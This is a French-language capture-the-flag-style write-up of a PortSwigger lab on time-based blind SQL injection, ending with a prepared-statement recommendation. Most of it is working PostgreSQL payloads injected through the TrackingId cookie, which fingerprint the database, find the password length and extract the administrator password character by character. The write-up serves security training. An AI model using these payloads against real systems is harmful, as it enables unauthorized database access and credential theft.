# 💉 Lab : Blind SQL injection with time delays and information retrieval
**Catégorie :** Injection SQL (SQLi)
**Type :** Blind SQLi (Time-Based / Basé sur le temps)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL en aveugle complète (Full Blind SQLi) via le cookie `TrackingId`. Le serveur web ne renvoie aucune donnée, aucun changement d'affichage, ni aucune erreur visible. La seule méthode d'interaction consiste à injecter des commandes temporelles (Time-delays). En forçant la base de données à "dormir" pendant plusieurs secondes uniquement si une condition précise est validée (TRUE), il est possible de cartographier la base et d'exfiltrer des données.

## 🛠️ Preuve de Concept (PoC)
La compromission s'est déroulée de manière entièrement manuelle et optimisée, sur un backend **PostgreSQL**, en suivant une méthode de résolution logique :

1. **Fingerprinting du SGBD :**
   - L'injection du délai `pg_sleep(10)` a confirmé la présence d'un backend PostgreSQL (les requêtes mettent 10 secondes à répondre).
   - *Payload test :* `TrackingId=xyz'||pg_sleep(10)--`

2. **Détermination de la longueur du mot de passe :**
   Avant d'extraire les caractères, une fonction `LENGTH()` a été intégrée dans la clause `CASE WHEN` pour trouver la taille exacte du mot de passe. Des tests avec `>10` ont été effectués, suivis d'un ciblage précis.
   - *Payload de validation :* ```http
     Cookie: TrackingId=FewI9hQSkh1Rl2Uo'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--;
     ```
   - *Résultat :* Délai de 10 secondes. Le mot de passe cible fait exactement **20 caractères**.

3. **Élaboration de la condition logique :**
   Mise en place d'une structure conditionnelle `CASE WHEN` pour lier le délai à la valeur d'une colonne :
   - `TrackingId=xyz'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` (Succès : l'utilisateur existe).   

4. **Exfiltration manuelle (Recherche Dichotomique / Binary Search) :**
   Pour éviter l'extrême lenteur du brute-force automatisé de Burp Intruder (720 requêtes x 4s de délai), l'extraction a été réalisée manuellement. L'utilisation des opérateurs mathématiques `<` et `>` a permis d'accélérer le processus de divination
   - *Exemple de test :
   * `TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'m') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` -> Délai de 4s
   * `TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'t') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` -> Délai de 4s
   * `TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'w') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` -> Délai de 4s
   * `TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'y') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` -> PAS Délai
   * `TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='y') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--` -> Délai de 4s (Validé).


5. **Vérification groupée des caractères (Sanity Check) :**
   Afin de s'assurer de l'absence d'erreurs en cours de route, la requête a été modifiée pour valider plusieurs caractères d'un coup (ex: les 4 ou 5 premiers) en modifiant l'index de `SUBSTRING`.
   - *Exemple de validation :* `SUBSTRING(password,1,5)='yy3ht'` -> Délai de 4s (Validé).

6. **Payload Final et Résultat :**
   Le 20ème et dernier caractère a été validé avec le payload englobant l'intégralité du mot de passe trouvé :
   - *Payload :* ```http
     GET / HTTP/2
     Host: 0a03001f031f76628205299a001400e8.web-security-academy.net
     Cookie: TrackingId=jzVkGnV1fFMa4xyy'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,20)='yy3htlmdrox8l8xerbdw') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--; session=IZBrYoNSGDhmn8vCS4a4hZhkPRjJMqVF
     ```
   - **Mot de passe extrait :** `yy3htlmdrox8l8xerbdw`

*La connexion avec ces identifiants a octroyé les privilèges administrateur.*

## 🛡️ Recommandation de Sécurité
Les attaques de type "Time-Based Blind" exploitent l'évaluation synchrone des requêtes par le backend. Il est impératif de cesser l'utilisation de requêtes SQL dynamiques construites via la concaténation de données utilisateur (ici le cookie `TrackingId`). L'utilisation de requêtes préparées (Prepared Statements) empêche systématiquement l'altération de la logique originelle de la requête.